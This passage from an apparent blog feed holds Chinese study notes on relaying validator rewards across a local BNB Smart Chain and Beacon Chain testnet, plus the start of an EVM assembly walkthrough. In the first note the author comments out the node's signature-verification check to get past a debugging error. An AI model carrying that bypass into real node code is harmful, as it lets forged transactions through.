<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221011172802.png" alt="20221011172802" /><br />
目前是轮流出块的状态</p>
<h2 id="模拟交易">模拟交易:</h2>
<p>在<code>BSCValidatorSet</code>合约中，查看验证者的收入:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221011173016.png" alt="20221011173016" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221011173049.png" alt="20221011173049" /><br />
验证者的收入来自gasfee,多次转账并提高gasPrice,使得矿工的收入大于<code>0.1BNB</code>,这样才满足跨链转账的前提。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># geth中以高gas price进行转账</span></span><br><span class="line">eth.sendTransaction(&#123;from: <span class="string">&quot;0x9FC0c18d285C66dD993B8fF43C2560481A2D8d04&quot;</span>, to: <span class="string">&quot;0xC1b025e7406461E06185dE04253267C61E3990F6&quot;</span>, value: web3.toWei(1, <span class="string">&quot;ether&quot;</span>), gasPrice: web3.toWei(20000, <span class="string">&quot;gwei&quot;</span>)&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="添加验证者">添加验证者:</h2>
<p>先在BC上添加2个验证者,等<code>bsc-relayer</code>中继器将新的验证者集合同步到BSC上。<br />
此时会触发<code>BSCValidatorSet</code>合约中奖励发放的逻辑，接下来看执行<code>TOKEN_HUB</code>合约里的<code>batchTransferOutBNB</code>函数交易是否正常、跨链转账是否能够正常进行。</p>
<p>bsc-relayer停了再运行后，发的同步跨链包的<code>sequence</code>不对，序列号没有按顺序且过大</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sequence not in order</span><br></pre></td></tr></table></figure>
<blockquote>
<p>中继器发跨链包的sequence是怎么获取的？</p>
</blockquote>
<p>中继器不断的<code>BatchRelayCrossChainPackages</code>后,<code>sequence</code>补齐了新增的验证者地址，同步成功：<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221012152342.png" alt="20221012152342" /></p>
<h2 id="查询BSCValidatorSet合约">查询BSCValidatorSet合约:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221020180049.png" alt="20221020180049" /><br />
原本验证者集合合约里还有一些BNB,现在应该是执行到跨链转账的阶段了<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221012152433.png" alt="20221012152433" /><br />
<a href="http://192.168.2.25:4000/tx/0x9e3da868071d68bb94b817001a1801a837c820bf688b6b305232124dc9a4e01f">本地tx</a><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221022143413.png" alt="20221022143413" /></p>
<h2 id="启动oracle-relayer">启动oracle-relayer:</h2>
<p>现在是要将BSC上获取的挖矿奖励,跨链到BC上,需要使用到<code>oracle-relayer</code>进行同步<br />
拉取 BSC 的跨链数据包，并针对 BC 的预言（prophecy）进行声明（claim）；</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动命令</span></span><br><span class="line">./build/relayer --bbc-network 1 --config-type <span class="built_in">local</span> --config-path config/config.json</span><br></pre></td></tr></table></figure>
<h3 id="报错1-环境设置不当">报错1: 环境设置不当</h3>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">2022-10-17 00:22:11 ERROR process claim error: err=&#123;<span class="string">&quot;codespace&quot;</span>:1,<span class="string">&quot;code&quot;</span>:7,<span class="string">&quot;abci_code&quot;</span>:65543,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;tbnb1fvpct0j9qt76skhgj362t8dll0ycztm2u2f0xu&quot;</span>&#125;</span><br><span class="line">2022-10-17 00:22:12 INFO Fetch fetch block, height=90353</span><br><span class="line">2022-10-17 00:22:12 ERROR Fetch fetch block error, err=get block info error, height=90353, err=not found</span><br><span class="line">2022-10-17 00:22:12 INFO process current sequence, chain_id=714, <span class="built_in">seq</span>=0</span><br><span class="line">2022-10-17 00:22:12 INFO process claim, chain_id=714, <span class="built_in">seq</span>=0, payload=f8c5f8c30380b8bf000000000000000000000000000000000000000000000000000000000000061a80f89ca0424e420000000000000000000000000000000000000000000000000000000000940000000000000000000000000000000000000000ca840bd696208410a79319ea9439de103a1bf89743829e1fb94261133a4d3719869461e25456b50d2ff65b48be75d0d435279d3f9e21ea9439de103a1bf89743829e1fb94261133a4d3719869461e25456b50d2ff65b48be75d0d435279d3f9e2184634660e5</span><br><span class="line">2022-10-17 00:22:12 ERROR process claim error: err=&#123;<span class="string">&quot;codespace&quot;</span>:1,<span class="string">&quot;code&quot;</span>:7,<span class="string">&quot;abci_code&quot;</span>:65543,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;tbnb1fvpct0j9qt76skhgj362t8dll0ycztm2u2f0xu&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>设置为生产环境，bc链的地址前缀才为<code>bnb</code>、测试环境的地址前缀为<code>tbnb</code></p>
<h3 id="报错2-交易验签失败">报错2: 交易验签失败</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2022-10-19 01:04:47 INFO process claim, chain_id=714, seq=0, payload=f8c5f8c30380b8bf000000000000000000000000000000000000000000000000000000000000061a80f89ca0424e420000000000000000000000000000000000000000000000000000000000940000000000000000000000000000000000000000ca840bd696208410a79319ea9439de103a1bf89743829e1fb94261133a4d3719869461e25456b50d2ff65b48be75d0d435279d3f9e21ea9439de103a1bf89743829e1fb94261133a4d3719869461e25456b50d2ff65b48be75d0d435279d3f9e2184634660e5</span><br><span class="line">2022-10-19 01:04:47 ERROR process claim error: err=claim error, code=65540, log=&#123;&quot;codespace&quot;:1,&quot;code&quot;:4,&quot;abci_code&quot;:65540,&quot;message&quot;:&quot;signature verification failed&quot;&#125;</span><br></pre></td></tr></table></figure>
<p><code>signature verification failed</code>签名验证失败</p>
<p>auth模块中的<code>AnteHandler</code>会提前对消息进行验证<br />
refs:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/jerrychan807/bnc-cosmos-sdk/blob/master/docs/sdk/core/app2.md">https://github.com/jerrychan807/bnc-cosmos-sdk/blob/master/docs/sdk/core/app2.md</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/jerrychan807/bnc-cosmos-sdk/blob/master/SECURITY.md">SECURITY.md</a> 有提到Tx 签名验证（x/auth/ante.go 中的代码）</p>
</li>
</ul>
<figure class="highlight go"><figcaption><span>node\common\tx\ante.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// verify the signature and increment the sequence.</span></span><br><span class="line"><span class="comment">// 验证签名并增加序列号</span></span><br><span class="line"><span class="comment">// if the account doesn&#x27;t have a pubkey, set it.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">processSig</span><span class="params">(txHash <span class="type">string</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">	sig auth.StdSignature, pubKey crypto.PubKey, signBytes []<span class="type">byte</span>)</span></span> (</span><br><span class="line">	res sdk.Result) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> sigCache.getSig(txHash) &#123;</span><br><span class="line">		log.Debug(<span class="string">&quot;Tx hits sig cache&quot;</span>, <span class="string">&quot;txHash&quot;</span>, txHash)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check sig.</span></span><br><span class="line">	<span class="comment">// pubKey.VerifyBytes(signBytes, sig.Signature) 用PubKey对签名进行验证</span></span><br><span class="line">	<span class="keyword">if</span> !pubKey.VerifyBytes(signBytes, sig.Signature) &#123;</span><br><span class="line">		<span class="keyword">return</span> sdk.ErrUnauthorized(<span class="string">&quot;signature verification failed&quot;</span>).Result()</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sigCache.addSig(txHash)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>修改BC的node源码，增加一些print，方便debug。在<code>processSig</code>函数中验证不通过,提示签名验证失败</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">D[2022-10-20|03:37:18.115] Scheduled <span class="built_in">timeout</span>                            module=consensus dur=993.499345ms height=4396 round=0 step=RoundStepNewHeight</span><br><span class="line">I[2022-10-20|03:37:18.378] ABCIQuery                                    module=rpc path=/store/sc/key data=F102CA00 result=<span class="string">&quot;key:\&quot;\\361\\002\\312\\000\&quot; height:4394 &quot;</span></span><br><span class="line">I[2022-10-20|03:37:18.378] WSJSONRPC                                    module=rpc-server protocol=websocket remote=192.168.2.24:54078 method=abci_query</span><br><span class="line">I[2022-10-20|03:37:18.386] ABCIQuery                                    module=rpc path=/store/oracle/key data=3731343A303A30 result=<span class="string">&quot;key:\&quot;714:0:0\&quot; height:4394 &quot;</span></span><br><span class="line">I[2022-10-20|03:37:18.386] WSJSONRPC                                    module=rpc-server protocol=websocket remote=192.168.2.24:54078 method=abci_query</span><br><span class="line">I[2022-10-20|03:37:18.392] ABCIQuery                                    module=rpc path=/account/bnb186t4z2pdu02khlfn5skqxpd36fwsa393mgu4hq data= result=<span class="string">&quot;value:\&quot;K\\334L&#x27;\\nP\\n\\024&gt;\\227Q(-\\343\\325k\\3753\\244,\\003\\005\\261\\322]\\016\\304\\261\\022\\014\\n\\003BNB\\020\\200\\334\\341\\251\\2427\\032&amp;\\353Z\\351\\207!\\003v\\321\\027\\037\\3414y\\211\\2225\\037\\304+\\3328\\351\\220\\\&quot;\\346\\211p\\021&#125;\\223?@x\\300\\337\\032\\315\\234 \\002(\\001\&quot; &quot;</span></span><br><span class="line">I[2022-10-20|03:37:18.392] WSJSONRPC                                    module=rpc-server protocol=websocket remote=192.168.2.24:54078 method=abci_query</span><br><span class="line">I[2022-10-20|03:37:18.393] Rejected bad transaction                     module=mempool tx=398EFE3CBE0BCCEDA5D9A74B7F627AA4639339604AE5119C04CD7362E7180EE4 res=<span class="string">&quot;&amp;&#123;CheckTx:code:65540 log:\&quot;&#123;\\\&quot;codespace\\\&quot;:1,\\\&quot;code\\\&quot;:4,\\\&quot;abci_code\\\&quot;:65540,\\\&quot;message\\\&quot;:\\\&quot;signature verification failed\\\&quot;&#125;\&quot; events:&lt;&gt; &#125;&quot;</span> err=null</span><br><span class="line">I[2022-10-20|03:37:18.394] WSJSONRPC                                    module=rpc-server protocol=websocket remote=192.168.2.24:54078 method=broadcast_tx_commit</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/tendermint/go-crypto/blob/master/pub_key.go">https://github.com/tendermint/go-crypto/blob/master/pub_key.go</a></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pubKey PubKeyEd25519)</span></span> VerifyBytes(msg []<span class="type">byte</span>, sig_ Signature) <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="comment">// make sure we use the same algorithm to sign</span></span><br><span class="line">	sig, ok := sig_.(SignatureEd25519)</span><br><span class="line">	<span class="keyword">if</span> !ok &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	pubKeyBytes := [<span class="number">32</span>]<span class="type">byte</span>(pubKey)</span><br><span class="line">	sigBytes := [<span class="number">64</span>]<span class="type">byte</span>(sig)</span><br><span class="line">	<span class="keyword">return</span> ed25519.Verify(&amp;pubKeyBytes, msg, &amp;sigBytes)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/tendermint/ed25519/blob/master/ed25519.go">https://github.com/tendermint/ed25519/blob/master/ed25519.go</a></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Verify returns true iff sig is a valid signature of message by publicKey.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Verify</span><span class="params">(publicKey *[PublicKeySize]<span class="type">byte</span>, message []<span class="type">byte</span>, sig *[SignatureSize]<span class="type">byte</span>)</span></span> <span class="type">bool</span> &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>验证sig 是否由公钥生成有效的消息签名</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">sig, err := privKey.Sign(msg)</span><br></pre></td></tr></table></figure>
<p>sig是用私钥对msg进行签名</p>
<blockquote>
<p>多次尝试后，没debug成功，先注释掉对应代码，跳过验签部分。</p>
</blockquote>
<h3 id="注释掉验签代码块">注释掉验签代码块:</h3>
<p>注释掉签名验证部分的函数,编译新的node,运行<code>oracle-relayer</code>,会报新的错误:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">2022-10-21 02:01:32 ERROR process claim error: err=claim error, code=721903, <span class="built_in">log</span>=&#123;<span class="string">&quot;codespace&quot;</span>:11,<span class="string">&quot;code&quot;</span>:1007,<span class="string">&quot;abci_code&quot;</span>:721903,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;claim must be made by actively bonded validator&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>报错提示：验证者必须是活跃状态的，换成BC初始账户，继续运行<code>oracle-relayer</code><br />
出现新的报错:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">process package failed, channel=3, sequence=0, error=ERROR:</span><br><span class="line">Codespace: 1</span><br><span class="line">Code: 10</span><br><span class="line">Message: <span class="string">&quot; &lt; 400000BNB&quot;</span></span><br><span class="line">module=oracle </span><br></pre></td></tr></table></figure>
<p>定位到</p>
<figure class="highlight go"><figcaption><span>bnc-cosmos-sdk\x\oracle\handler.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// 扣除手续费</span></span><br><span class="line">	_, _, sdkErr := oracleKeeper.BkKeeper.SubtractCoins(ctx, sdk.PegAccount, fee)</span><br></pre></td></tr></table></figure>
<p>应该是会从托管账户里扣除手续费</p>
<figure class="highlight go"><figcaption><span>bnc-cosmos-sdk\types\cross_chain.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	<span class="comment">// bnb prefix address:  bnb1v8vkkymvhe2sf7gd2092ujc6hweta38xadu2pj</span></span><br><span class="line">	<span class="comment">// tbnb prefix address: tbnb1v8vkkymvhe2sf7gd2092ujc6hweta38xnc4wpr</span></span><br><span class="line">	PegAccount = AccAddress(crypto.AddressHash([]<span class="type">byte</span>(<span class="string">&quot;BinanceChainPegAccount&quot;</span>)))</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>找到托管账户地址，给托管账户充值BNB:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">bnbcli send --chain-id=715 --from=bnb1macd49chays0zqak9xedjzcxupkv4s87s7w5ze --amount=<span class="string">&quot;8000000000000:BNB&quot;</span> --to=bnb1v8vkkymvhe2sf7gd2092ujc6hweta38xadu2pj --sequence=4</span><br></pre></td></tr></table></figure>
<h2 id="成功声明预言值">成功声明预言值:</h2>
<p>再次运行<code>oracle-relayer</code>,这次claim 成功了。。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">2022-10-21 03:40:03 INFO process current sequence, chain_id=714, <span class="built_in">seq</span>=1</span><br><span class="line">2022-10-21 03:40:03 INFO Fetch fetch block, height=27541</span><br><span class="line">[*] claimLogs: [0xc00127f220]</span><br><span class="line">[*] len claimLogs: 1</span><br><span class="line">[*] prophecy: &lt;nil&gt;</span><br><span class="line">[*] validatorAddress: bva1macd49chays0zqak9xedjzcxupkv4s87sz0yua</span><br><span class="line">[*] claimLog: &amp;&#123;2 714 1 0 11 000000000000000000000000000000000000000000000000000000000000000000e094c1b025e7406461e06185de04253267c61e3990f68204348202ca8463512988 0 1 0x7ed1aecbe7e2290acdd11f054e27eb511a27ae71e9ca5d648d9d24869ab33263 0x93f73ad8e3228c20ad34899f20e6d2c35b653e7e42510f282e2b5a86747589bb  1076 15 1666320721 1666320721&#125;</span><br><span class="line">2022-10-21 03:40:03 INFO process claim, chain_id=714, <span class="built_in">seq</span>=1, payload=f848f8460b80b842000000000000000000000000000000000000000000000000000000000000000000e094c1b025e7406461e06185de04253267c61e3990f68204348202ca8463512988</span><br><span class="line">2022-10-21 03:40:04 INFO Claim claim success, tx_hash=57D765A0D15825577434B29B6195D56DA147E188A4978FABF8AF27409529E444</span><br><span class="line">2022-10-21 03:40:04 INFO process current sequence, chain_id=714, <span class="built_in">seq</span>=1</span><br><span class="line">2022-10-21 03:40:04 INFO Fetch fetch block, height=27645</span><br><span class="line">[*] claimLogs: []</span><br><span class="line">[*] len claimLogs: 0</span><br></pre></td></tr></table></figure>
<p>声明成功,数据库状态修改为 已声明，值为2</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221021184410.png" alt="20221021184410" /></p>
<h2 id="检查验证者的余额">检查验证者的余额:</h2>
<p>未执行oracle-relayer之前</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># bnbcli account bnb186t4z2pdu02khlfn5skqxpd36fwsa393mgu4hq --trust-node</span></span><br><span class="line">&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;bnbchain/Account&quot;</span>,<span class="string">&quot;value&quot;</span>:&#123;<span class="string">&quot;base&quot;</span>:&#123;<span class="string">&quot;address&quot;</span>:<span class="string">&quot;bnb186t4z2pdu02khlfn5skqxpd36fwsa393mgu4hq&quot;</span>,<span class="string">&quot;coins&quot;</span>:[&#123;<span class="string">&quot;denom&quot;</span>:<span class="string">&quot;BNB&quot;</span>,<span class="string">&quot;amount&quot;</span>:<span class="string">&quot;1902906976744&quot;</span>&#125;],<span class="string">&quot;public_key&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;tendermint/PubKeySecp256k1&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;A3bRFx/hNHmJkjUfxCvaOOmQIuaJcBF9kz9AeMDfGs2c&quot;</span>&#125;,<span class="string">&quot;account_number&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;sequence&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;frozen&quot;</span>:null,<span class="string">&quot;locked&quot;</span>:null,<span class="string">&quot;flags&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;&#125;</span><br><span class="line">[root@localhost ~]<span class="comment"># bnbcli account bnb1v64323yrzekauf89qhsfrvyhe7xsvsck00jwpv --trust-node</span></span><br><span class="line">&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;bnbchain/Account&quot;</span>,<span class="string">&quot;value&quot;</span>:&#123;<span class="string">&quot;base&quot;</span>:&#123;<span class="string">&quot;address&quot;</span>:<span class="string">&quot;bnb1v64323yrzekauf89qhsfrvyhe7xsvsck00jwpv&quot;</span>,<span class="string">&quot;coins&quot;</span>:[&#123;<span class="string">&quot;denom&quot;</span>:<span class="string">&quot;BNB&quot;</span>,<span class="string">&quot;amount&quot;</span>:<span class="string">&quot;3803093023256&quot;</span>&#125;],<span class="string">&quot;public_key&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;tendermint/PubKeySecp256k1&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;ApAG3Q9tZFtGw4vYvn72Q14QJHWxVg6uw3R/dKbMVTle&quot;</span>&#125;,<span class="string">&quot;account_number&quot;</span>:<span class="string">&quot;3&quot;</span>,<span class="string">&quot;sequence&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;frozen&quot;</span>:null,<span class="string">&quot;locked&quot;</span>:null,<span class="string">&quot;flags&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># bnbcli account bnb186t4z2pdu02khlfn5skqxpd36fwsa393mgu4hq --trust-node</span></span><br><span class="line">&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;bnbchain/Account&quot;</span>,<span class="string">&quot;value&quot;</span>:&#123;<span class="string">&quot;base&quot;</span>:&#123;<span class="string">&quot;address&quot;</span>:<span class="string">&quot;bnb186t4z2pdu02khlfn5skqxpd36fwsa393mgu4hq&quot;</span>,<span class="string">&quot;coins&quot;</span>:[&#123;<span class="string">&quot;denom&quot;</span>:<span class="string">&quot;BNB&quot;</span>,<span class="string">&quot;amount&quot;</span>:<span class="string">&quot;1902906976744&quot;</span>&#125;],<span class="string">&quot;public_key&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;tendermint/PubKeySecp256k1&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;A3bRFx/hNHmJkjUfxCvaOOmQIuaJcBF9kz9AeMDfGs2c&quot;</span>&#125;,<span class="string">&quot;account_number&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;sequence&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;frozen&quot;</span>:null,<span class="string">&quot;locked&quot;</span>:null,<span class="string">&quot;flags&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;&#125;</span><br><span class="line">[root@localhost ~]<span class="comment"># bnbcli account bnb1v64323yrzekauf89qhsfrvyhe7xsvsck00jwpv --trust-node</span></span><br><span class="line">&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;bnbchain/Account&quot;</span>,<span class="string">&quot;value&quot;</span>:&#123;<span class="string">&quot;base&quot;</span>:&#123;<span class="string">&quot;address&quot;</span>:<span class="string">&quot;bnb1v64323yrzekauf89qhsfrvyhe7xsvsck00jwpv&quot;</span>,<span class="string">&quot;coins&quot;</span>:[&#123;<span class="string">&quot;denom&quot;</span>:<span class="string">&quot;BNB&quot;</span>,<span class="string">&quot;amount&quot;</span>:<span class="string">&quot;3803115052627&quot;</span>&#125;],<span class="string">&quot;public_key&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;tendermint/PubKeySecp256k1&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;ApAG3Q9tZFtGw4vYvn72Q14QJHWxVg6uw3R/dKbMVTle&quot;</span>&#125;,<span class="string">&quot;account_number&quot;</span>:<span class="string">&quot;3&quot;</span>,<span class="string">&quot;sequence&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;frozen&quot;</span>:null,<span class="string">&quot;locked&quot;</span>:null,<span class="string">&quot;flags&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>账户2余额由<code>38030.93023256</code>变为<code>38031.15052627</code>,余额增加了,bnb奖励应该是跨链成功了。</p>
<h1>小结:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>每个validator都要运行oracle-relayer</p>
</li>
<li class="lvl-2">
<p>应该是每个validator都要运行beaconchain</p>
</li>
<li class="lvl-2">
<p>anteHandler验证签名处还没搞定</p>
</li>
<li class="lvl-2">
<p><code>bnc-cosmos-sdk\x\oracle\handler.go</code>里处理声明后,在BC上奖励分配的代码还没厘清楚</p>
</li>
</ul>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/Sifchain/peggy">https://github.com/Sifchain/peggy</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/Sifchain/peggy/blob/develop/docs/cosmos-to-ethereum.md">https://github.com/Sifchain/peggy/blob/develop/docs/cosmos-to-ethereum.md</a></p>
</li>
<li class="lvl-2">
<p><a href="https://devpost.com/software/peggy">https://devpost.com/software/peggy</a></p>
</li>
<li class="lvl-2">
<p><a href="https://docs.bnbchain.org/docs/learn/oracle-module/">Cross-chain: Oracle on Binance Chain</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-DivingIntoThe_EVM_Part1_Introduction_to_the_EVM_assembly_code</title>
    <url>/2022/46486.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><a href="https://blog.qtum.org/diving-into-the-ethereum-vm-6e8d5d2f3c30">Diving Into The Ethereum Virtual Machine</a> StudyRecord</p>
<h1>Article pre:</h1>
<p>Solidity offers many high-level language abstractions, but these features make it hard to understand what’s really going on when my program is running.</p>
<p>Reading the Solidity documentation still left me confused over very basic things.</p>
<p>What are the differences between string, bytes32, byte[], bytes?</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Which one do I use, when?</p>
</li>
<li class="lvl-2">
<p>What’s happening when I cast a string to bytes? Can I cast to byte[]?</p>
</li>
<li class="lvl-2">
<p>How much do they cost?</p>
</li>
</ul>
<p>How are mappings stored by the EVM?</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Why can’t I delete a mapping?</p>
</li>
<li class="lvl-2">
<p>Can I have mappings of mappings? (Yes, but how does that work?)</p>
</li>
<li class="lvl-2">
<p>Why is there storage mapping, but no memory mapping?</p>
</li>
</ul>
<p>How does a compiled contract look to the EVM?</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>How is a contract created?</p>
</li>
<li class="lvl-2">
<p>What is a constructor, really?</p>
</li>
<li class="lvl-2">
<p>What is the fallback function?</p>
</li>
</ul>
<h1>One Storage Variables:</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// c1.sol</span></span><br><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.11</span>;</span><br><span class="line">contract C &#123; <span class="comment">// a constructor</span></span><br><span class="line">    uint256 a; <span class="comment">// a state variable</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">C</span>(<span class="params"></span>) &#123;</span><br><span class="line">      a = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Compile this contract with solc:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用docker环境里的solc-select</span></span><br><span class="line">solc-select use 0.4.12</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$  solc --bin --asm c1.sol</span><br><span class="line"></span><br><span class="line">======= c1.sol:C =======</span><br><span class="line">EVM assembly:</span><br><span class="line">    /* &quot;c1.sol&quot;:35:102  contract C &#123;... */</span><br><span class="line">  mstore(0x40, 0x60)</span><br><span class="line">    /* &quot;c1.sol&quot;:67:100  function C() &#123;... */</span><br><span class="line">  jumpi(tag_1, iszero(callvalue))</span><br><span class="line">  0x0</span><br><span class="line">  dup1</span><br><span class="line">  revert</span><br><span class="line">tag_1:</span><br><span class="line">tag_2:</span><br><span class="line">    /* &quot;c1.sol&quot;:92:93  1 */</span><br><span class="line">  0x1</span><br><span class="line">    /* &quot;c1.sol&quot;:88:89  a */</span><br><span class="line">  0x0</span><br><span class="line">    /* &quot;c1.sol&quot;:88:93  a = 1 */</span><br><span class="line">  dup2</span><br><span class="line">  swap1</span><br><span class="line">  sstore</span><br><span class="line">  pop</span><br><span class="line">    /* &quot;c1.sol&quot;:67:100  function C() &#123;... */</span><br><span class="line">tag_3:</span><br><span class="line">    /* &quot;c1.sol&quot;:35:102  contract C &#123;... */</span><br><span class="line">tag_4:</span><br><span class="line">  dataSize(sub_0)</span><br><span class="line">  dup1</span><br><span class="line">  dataOffset(sub_0)</span><br><span class="line">  0x0</span><br><span class="line">  codecopy</span><br><span class="line">  0x0</span><br><span class="line">  return</span><br><span class="line">stop</span><br><span class="line"></span><br><span class="line">sub_0: assembly &#123;</span><br><span class="line">        /* &quot;c1.sol&quot;:35:102  contract C &#123;... */</span><br><span class="line">      mstore(0x40, 0x60)</span><br><span class="line">    tag_1:</span><br><span class="line">      0x0</span><br><span class="line">      dup1</span><br><span class="line">      revert</span><br><span class="line"></span><br><span class="line">auxdata: 0xa165627a7a72305820ddb16b0f7c271651b06d31b94a319888a30cd4644e30518f4079851a5ee37a210029</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Binary:</span><br><span class="line">60606040523415600e57600080fd5b5b60016000819055505b5b60368060266000396000f30060606040525b600080fd00a165627a7a72305820ddb16b0f7c271651b06d31b94a319888a30cd4644e30518f4079851a5ee37a210029</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>编译出来的Binary和原文有些不同，但应该问题不大。<br />
evm实际跑的是<code>Binary</code>里的数据</p>
<h2 id="In-Baby-Steps：">In Baby Steps：</h2>
<p>从storage variable assignment看起：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = 1</span><br></pre></td></tr></table></figure>
<p>This assignment is represented by the bytecode <code>6001600081905550</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">60 01</span><br><span class="line">60 00</span><br><span class="line">81</span><br><span class="line">90</span><br><span class="line">55</span><br><span class="line">50</span><br></pre></td></tr></table></figure>
<p>The EVM is basically a loop that execute each instruction from top to bottom</p>
<p>把上面<code>tgs_2</code>的内容换个格式；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tag_2:</span><br><span class="line">  // 60 01</span><br><span class="line">  0x1</span><br><span class="line">  // 60 00</span><br><span class="line">  0x0</span><br><span class="line">  // 81</span><br><span class="line">  dup2</span><br><span class="line">  // 90</span><br><span class="line">  swap1</span><br><span class="line">  // 55</span><br><span class="line">  sstore</span><br><span class="line">  // 50</span><br><span class="line">  pop</span><br></pre></td></tr></table></figure>
